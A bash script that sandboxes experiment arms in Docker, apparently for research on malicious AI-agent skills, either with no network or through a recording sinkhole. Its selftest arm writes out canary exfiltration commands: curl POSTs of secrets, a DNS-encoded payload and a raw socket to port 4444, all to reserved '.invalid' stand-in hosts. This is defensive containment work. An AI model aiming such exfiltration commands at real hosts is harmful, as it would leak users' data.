#!/usr/bin/env bash
#
# Run an experiment arm inside a container, in one of two modes.
#
# DEFAULT — no network at all. The arms this wraps read live attack code (AgentTrap's 91 malicious
# skills) or compile payloads. None of them needs a network, so `--network=none` turns "we did not
# attempt exfiltration" into "exfiltration was not possible". That is the difference worth having
# when the material is somebody else's malware.
#
# `--observe` — a network that goes to exactly one place. Every name resolves to a sinkhole
# container, every connection lands on it, TLS is terminated there, and the request is written down
# before a plausible success is returned. This answers the question the default mode destroys:
# not *did* anything leave, but *what would have left, and where was it addressed?*
#
#   Read the trade honestly. `--network=none` is a proof — nothing left because nothing could.
#   `--observe` is a strong belief, resting on the sinkhole network being created `--internal` and
#   on Docker honouring that. It is the weaker guarantee, so it is not the default, and it is not
#   the mode to pick when the only question is whether an arm is safe to run.
#
# In both modes the corpus and the repository are mounted READ-ONLY; only a results directory is
# writable, so nothing a payload does can reach tracked files.
#
# Usage:
#   ./run-sandboxed.sh build
#   ./run-sandboxed.sh test10                       # rule catalogue, needs the harvested corpus
#   ./run-sandboxed.sh test8  <agenttrap-dir>       # linters vs the malicious corpus
#   ./run-sandboxed.sh test9  <lang...>             # compile + lint per language
#   ./run-sandboxed.sh shell  [agenttrap-dir]       # poke around, still with no network
#   ./run-sandboxed.sh --observe shell <dir>        # same, with everything it sends recorded
#
# NOT covered here, and deliberately: the MLX local-model arms (need the host GPU), the `agy`
# frontier arms (need vendor egress and host credentials) and Claude subagents (run in-process).
# See ../SAFETY.md.
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
REPO="$(cd "$HERE/.." && pwd)"
IMAGE="dependencyskills-experiments"
SINK_IMAGE="dependencyskills-sinkhole"
NET="dependencyskills-sinkhole-net"
SUBNET="10.77.0.0/24"
SINK_IP="10.77.0.2"

OBSERVE=0
if [ "${1:-}" = "--observe" ]; then OBSERVE=1; shift; fi

CMD="${1:-}"; shift || true

case "$CMD" in
  build)
    docker build -t "$IMAGE" "$HERE"
    docker build -t "$SINK_IMAGE" "$HERE/sinkhole"
    exit 0
    ;;
  "")
    sed -n '3,30p' "$0" | sed 's/^# \{0,1\}//'
    exit 1
    ;;
esac

docker image inspect "$IMAGE" >/dev/null 2>&1 || {
  echo "image not built — run: $0 build" >&2; exit 1; }

RESULTS="$(mktemp -d)"
MOUNTS=(-v "$REPO:/work:ro" -v "$RESULTS:/results")

# An attack corpus, if the arm needs one, always read-only.
CORPUS="${1:-}"
if [ -n "$CORPUS" ] && [ -d "$CORPUS" ]; then
  MOUNTS+=(-v "$(cd "$CORPUS" && pwd):/corpus:ro")
  shift
  CORPUS_ARG=/corpus
else
  CORPUS_ARG=""
fi

case "$CMD" in
  test8)  RUN="cd /work/experiments/test8 && python3 linter_vs_agenttrap.py ${CORPUS_ARG}" ;;
  test9)  RUN="cd /work/experiments/test9 && python3 stages_1_2.py ${*:-kotlin java js}" ;;
  test10) RUN="cd /work/experiments/test10 && python3 evaluate.py" ;;
  shell)  RUN="bash" ;;
  # A positive control for `--observe`. A recorder that quietly records nothing is indistinguishable
  # from a payload that did nothing, and the second reading is the one everybody wants to believe.
  # This arm sends a known canary by four routes, so an empty log is a broken sinkhole and says so.
  # All four destinations are `.invalid` (RFC 2606) and can never resolve anywhere real.
  selftest)
    RUN=$(cat <<'ARM'
set +e
echo "-- plain HTTP"
curl -s -m 5 -X POST http://collector.example.invalid/ingest -d 'secret=CANARY-PLAIN' -o /dev/null
echo "-- HTTPS, verifying against whatever CA it is given"
curl -s -m 5 -X POST https://collector.example.invalid/ingest -d 'secret=CANARY-TLS' -o /dev/null
echo "-- DNS only, the name carries the payload"
getent hosts CANARY-DNS.exfil.example.invalid >/dev/null
echo "-- raw socket on a non-web port"
python3 -c "
import socket
s = socket.create_connection(('shell.example.invalid', 4444), 5)
s.sendall(b'CANARY-RAW\n')
s.close()"
echo "-- done"
ARM
) ;;
  *)      echo "unknown arm: $CMD" >&2; exit 1 ;;
esac

# ---------------------------------------------------------------- network, one mode or the other
NETWORK=(--network=none)
SINK_ID=""
SHARED=""

cleanup() {
  [ -n "$SINK_ID" ] && docker rm -f "$SINK_ID" >/dev/null 2>&1 || true
  [ "$OBSERVE" = 1 ] && docker network rm "$NET" >/dev/null 2>&1 || true
}
trap cleanup EXIT

if [ "$OBSERVE" = 1 ]; then
  docker image inspect "$SINK_IMAGE" >/dev/null 2>&1 || {
    echo "sinkhole image not built — run: $0 build" >&2; exit 1; }

  SHARED="$(mktemp -d)"
  # `--internal` is the containment. Docker attaches no gateway to this network, so nothing on it
  # has a route off the host even if the sinkhole itself is misconfigured or crashes.
  docker network rm "$NET" >/dev/null 2>&1 || true
  docker network create --internal --subnet "$SUBNET" "$NET" >/dev/null

  SINK_ID=$(docker run -d --rm \
    --network "$NET" --ip "$SINK_IP" \
    --cap-add=NET_ADMIN \
    -e "SINKHOLE_IP=$SINK_IP" \
    -v "$SHARED:/shared" \
    "$SINK_IMAGE")

  for _ in $(seq 1 50); do
    [ -f "$SHARED/ready" ] && break
    sleep 0.2
  done
  if [ ! -f "$SHARED/ready" ]; then
    echo "sinkhole did not come up; its log follows" >&2
    docker logs "$SINK_ID" >&2 || true
    exit 1
  fi

  NETWORK=(--network "$NET" --dns "$SINK_IP")
  # The generated CA, so a payload that verifies properly still completes and shows us its body.
  # Java is not covered: the JVM wants a keystore rather than a PEM, so a Java client sees an
  # unknown issuer and lands in the log as `tls-refused` — destination recorded, body not.
  MOUNTS+=(-v "$SHARED/ca.pem:/sinkhole/ca.pem:ro")
  CA_ENV=(
    -e SSL_CERT_FILE=/sinkhole/ca.pem
    -e CURL_CA_BUNDLE=/sinkhole/ca.pem
    -e REQUESTS_CA_BUNDLE=/sinkhole/ca.pem
    -e NODE_EXTRA_CA_CERTS=/sinkhole/ca.pem
  )
  echo "# running '$CMD' WITH A NETWORK, sinkholed to $SINK_IP — this is the weaker guarantee"
else
  CA_ENV=()
  echo "# running '$CMD' with --network=none; results land in $RESULTS"
fi

# -it only when stdin is a terminal; it fails outright when run from a script or CI.
TTY=(); [ -t 0 ] && TTY=(-it)

docker run --rm ${TTY[@]+"${TTY[@]}"} \
  "${NETWORK[@]}" \
  --read-only --tmpfs /tmp:exec --tmpfs /home/runner:uid=1001,gid=1001 \
  --cap-drop=ALL --security-opt no-new-privileges \
  --memory=4g --pids-limit=512 \
  "${MOUNTS[@]}" ${CA_ENV[@]+"${CA_ENV[@]}"} \
  "$IMAGE" bash -lc "$RUN"

echo "# results kept at $RESULTS"

if [ "$OBSERVE" = 1 ]; then
  # Copy the log out before the trap removes the sinkhole with it.
  if [ -s "$SHARED/egress.jsonl" ]; then
    cp "$SHARED/egress.jsonl" "$RESULTS/egress.jsonl"
    echo "# egress recorded at $RESULTS/egress.jsonl"
    python3 "$HERE/sinkhole/summarise.py" "$RESULTS/egress.jsonl" || true
  else
    echo "# nothing was sent"
  fi
fi
